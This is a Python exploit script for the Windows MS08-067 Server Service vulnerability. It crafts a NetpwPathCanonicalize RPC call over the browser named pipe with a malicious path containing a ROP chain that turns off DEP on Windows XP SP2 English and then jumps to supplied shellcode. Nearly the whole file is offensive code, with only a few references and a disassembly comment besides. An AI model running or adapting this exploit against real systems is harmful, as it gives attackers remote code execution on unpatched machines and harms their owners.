# -*- coding: utf-8 -*-

"""
Remote exploit code for MS08-67

References:
  https://www.mysonicwall.com/sonicalert/searchresults.aspx?ev=article&id=74
  https://labs.mwrinfosecurity.com/assets/BlogFiles/hellox-ms08-067-my-old-friend.pdf
  https://www.exploit-db.com/exploits/40279/
  https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/smb/ms08_067_netapi.rb
"""

from impacket import *
from impacket import uuid
from RPC import *

class MicrosoftServerService(object):
    def __init__(self, Host):
        self.Host = Host
        
    def NetpwPathCanonicalize(self, ServerName, PathName, Outbuf, OutbufLen, Prefix, PathType, Flags):
        # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/77aacc74-f8f9-4b46-b2d8-bfe04a7d9c44
        SRVSVC = ('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')
        ordinal = 0x1f
        stub = ''.join([
            NDR.UniqueWString(ServerName, False),
            NDR.WString(PathName, False),
            NDR.Long(OutbufLen),
            NDR.WString(Prefix),
            NDR.Long(PathType),
            NDR.Long(Flags),
        ])
        
        dce = DCE('ncacn_np:%s[\\pipe\\browser]' % self.Host) # Connect to host
        dce.bind(uuid.uuidtup_to_bin(SRVSVC)) # Bind to RPC Server Service
        dce.call(ordinal, stub) # Call NetpwPathCanonicalize

    Exploit = lambda self, RopChain, Payload: \
        self.NetpwPathCanonicalize(
            Payload + '\x00'*2,
            PackWString('\\A\\..\\..\\') + '_'*18 + RopChain + '_'*(56 - len(RopChain)) + '\x00'*2,
            None, 1, '\x5c\x00', 1, 1
        )

'''
AcGenral!0x6F8916E2
    push    4
    lea     eax, [ebp+arg_0]
    push    eax
    push    22h
    push    0FFFFFFFFh
    mov     [ebp+arg_0], 2
    call    ds:NtSetInformationProcess()
    xor     eax, eax
    inc     eax
    pop     ebp
    retn    4
'''
class XP_SP2_English(MicrosoftServerService):
    def Exploit(self, shellcode):
        super(XP_SP2_English, self).Exploit(
            # RopChain
            PackList([
                0x6F8AEADF, # pop ebx; ret
                0x6F8BBFF0, # End of AcGenral!.data
                0x6F8916E2, # Disable DEP; pop ebp; retn 4
                0x41414141, #
                0x771bb40b, # push esp; ret
                0x41414141, #
            ], PackDWORD) +
            # Jumper to Shellcode
            '\x66\xb8\x8c\x04' + # mov ax, 0x48c
            '\x03\xe0'         + # add esp, eax
            '\xff\x14\x24',      # call [esp]
            shellcode
        )